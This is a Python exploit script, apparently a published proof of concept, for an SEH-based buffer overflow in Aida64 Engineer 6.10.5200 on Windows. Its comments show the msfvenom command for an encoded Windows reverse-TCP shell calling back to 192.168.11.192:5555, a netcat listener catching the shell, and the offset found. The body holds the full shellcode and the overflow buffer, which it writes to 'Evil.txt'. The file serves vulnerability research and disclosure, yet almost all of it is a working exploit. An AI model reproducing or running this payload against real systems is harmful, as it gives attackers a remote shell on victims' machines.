#!/usr/bin/python

#root@kali:~# nc -nvlp 5555
#listening on [any] 5555 ...
#connect to [192.168.11.192] from (UNKNOWN) [192.168.11.190] 49218
#Microsoft Windows [Version 6.1.7601]
#Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
#
#C:\Users\User\Desktop\Aida64 6.10.5200 - Buffer Overflow (SEH)\c5fee1d63f480585efa5feb01b271e1a-aida64engineer610>


#032525D1   5F               POP EDI
#032525D2   5E               POP ESI
#032525D3   C3               RETN

#root@kali:~# msfvenom -p windows/shell_reverse_tcp lhost=192.168.11.192 lport=5555 -e x86/alpha_mixed -f python
#[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
#[-] No arch selected, selecting arch: x86 from the payload
#Found 1 compatible encoders
#Attempting to encode payload with 1 iterations of x86/alpha_mixed
#x86/alpha_mixed succeeded with size 709 (iteration=0)
#x86/alpha_mixed chosen with final size 709
#Payload size: 709 bytes
#Final size of python file: 3396 bytes
buf =  ""
buf += "\xdb\xd1\xd9\x74\x24\xf4\x5d\x55\x59\x49\x49\x49\x49"
buf += "\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x43\x37"
buf += "\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41"
buf += "\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58"
buf += "\x50\x38\x41\x42\x75\x4a\x49\x79\x6c\x6a\x48\x4f\x72"
buf += "\x43\x30\x33\x30\x75\x50\x35\x30\x4d\x59\x68\x65\x74"
buf += "\x71\x79\x50\x51\x74\x6e\x6b\x46\x30\x50\x30\x4c\x4b"
buf += "\x51\x42\x66\x6c\x4e\x6b\x56\x32\x57\x64\x4c\x4b\x73"
buf += "\x42\x44\x68\x76\x6f\x48\x37\x30\x4a\x47\x56\x30\x31"
buf += "\x6b\x4f\x4e\x4c\x35\x6c\x31\x71\x73\x4c\x34\x42\x54"
buf += "\x6c\x45\x70\x4f\x31\x5a\x6f\x66\x6d\x53\x31\x4b\x77"
buf += "\x79\x72\x38\x72\x50\x52\x73\x67\x4e\x6b\x30\x52\x34"
buf += "\x50\x6c\x4b\x50\x4a\x57\x4c\x6c\x4b\x30\x4c\x57\x61"
buf += "\x62\x58\x78\x63\x72\x68\x47\x71\x5a\x71\x46\x31\x6e"
buf += "\x6b\x46\x39\x57\x50\x53\x31\x4e\x33\x6c\x4b\x72\x69"
buf += "\x56\x78\x4a\x43\x57\x4a\x43\x79\x6c\x4b\x50\x34\x4c"
buf += "\x4b\x37\x71\x38\x56\x66\x51\x69\x6f\x4c\x6c\x4b\x71"
buf += "\x4a\x6f\x34\x4d\x66\x61\x5a\x67\x55\x68\x59\x70\x42"
buf += "\x55\x39\x66\x74\x43\x51\x6d\x78\x78\x45\x6b\x61\x6d"
buf += "\x37\x54\x63\x45\x79\x74\x73\x68\x6c\x4b\x33\x68\x35"
buf += "\x74\x76\x61\x69\x43\x62\x46\x4c\x4b\x74\x4c\x32\x6b"
buf += "\x4c\x4b\x62\x78\x45\x4c\x46\x61\x69\x43\x6e\x6b\x55"
buf += "\x54\x6c\x4b\x73\x31\x6e\x30\x4b\x39\x33\x74\x76\x44"
buf += "\x66\x44\x31\x4b\x51\x4b\x31\x71\x53\x69\x43\x6a\x56"
buf += "\x31\x6b\x4f\x6b\x50\x61\x4f\x31\x4f\x52\x7a\x4c\x4b"
buf += "\x45\x42\x48\x6b\x6e\x6d\x51\x4d\x73\x58\x36\x53\x36"
buf += "\x52\x67\x70\x67\x70\x43\x58\x42\x57\x51\x63\x30\x32"
buf += "\x63\x6f\x73\x64\x53\x58\x70\x4c\x43\x47\x31\x36\x76"
buf += "\x67\x39\x6f\x38\x55\x58\x38\x5a\x30\x76\x61\x55\x50"
buf += "\x33\x30\x65\x79\x69\x54\x30\x54\x36\x30\x61\x78\x74"
buf += "\x69\x4b\x30\x32\x4b\x43\x30\x6b\x4f\x6a\x75\x62\x70"
buf += "\x56\x30\x62\x70\x72\x70\x31\x50\x36\x30\x77\x30\x52"
buf += "\x70\x43\x58\x68\x6a\x36\x6f\x6b\x6f\x39\x70\x39\x6f"
buf += "\x6e\x35\x4c\x57\x72\x4a\x36\x65\x71\x78\x59\x50\x6f"
buf += "\x58\x66\x6b\x59\x50\x63\x58\x46\x62\x65\x50\x34\x55"
buf += "\x4c\x73\x6b\x39\x39\x76\x73\x5a\x46\x70\x53\x66\x36"
buf += "\x37\x70\x68\x4d\x49\x69\x35\x63\x44\x51\x71\x49\x6f"
buf += "\x59\x45\x6f\x75\x4b\x70\x72\x54\x64\x4c\x49\x6f\x70"
buf += "\x4e\x46\x68\x52\x55\x4a\x4c\x50\x68\x4a\x50\x4c\x75"
buf += "\x69\x32\x31\x46\x79\x6f\x69\x45\x65\x38\x51\x73\x70"
buf += "\x6d\x42\x44\x45\x50\x6b\x39\x69\x73\x42\x77\x70\x57"
buf += "\x33\x67\x45\x61\x6b\x46\x32\x4a\x36\x72\x56\x39\x71"
buf += "\x46\x78\x62\x69\x6d\x70\x66\x78\x47\x42\x64\x56\x44"
buf += "\x77\x4c\x66\x61\x57\x71\x4c\x4d\x51\x54\x74\x64\x74"
buf += "\x50\x6b\x76\x67\x70\x50\x44\x53\x64\x62\x70\x50\x56"
buf += "\x63\x66\x52\x76\x53\x76\x71\x46\x30\x4e\x66\x36\x63"
buf += "\x66\x36\x33\x53\x66\x31\x78\x44\x39\x68\x4c\x67\x4f"
buf += "\x6b\x36\x79\x6f\x79\x45\x6f\x79\x6d\x30\x52\x6e\x70"
buf += "\x56\x37\x36\x79\x6f\x76\x50\x50\x68\x53\x38\x6e\x67"
buf += "\x57\x6d\x71\x70\x6b\x4f\x4a\x75\x6d\x6b\x4c\x30\x4d"
buf += "\x65\x4d\x72\x50\x56\x61\x78\x4d\x76\x6c\x55\x6d\x6d"
buf += "\x4f\x6d\x39\x6f\x38\x55\x45\x6c\x43\x36\x61\x6c\x34"
buf += "\x4a\x4d\x50\x39\x6b\x49\x70\x30\x75\x44\x45\x6f\x4b"
buf += "\x31\x57\x42\x33\x72\x52\x62\x4f\x30\x6a\x37\x70\x70"
buf += "\x53\x49\x6f\x78\x55\x41\x41"


buffer = "A"*(1042-4) + "\x71\x06\x70\x04" + "\xD1\x25\x25\x03" + buf + "C"*5000
#root@kali:~# /usr/bin/msf-pattern_offset -q 69423769
#[*] Exact match at offset 1042

try:
	f=open("Evil.txt","w")
	print "[+] Creating %s bytes evil payload.." %len(buffer)
	f.write(buffer)
	f.close()
	print "[+] File created!"
except Exception as e:
	print e
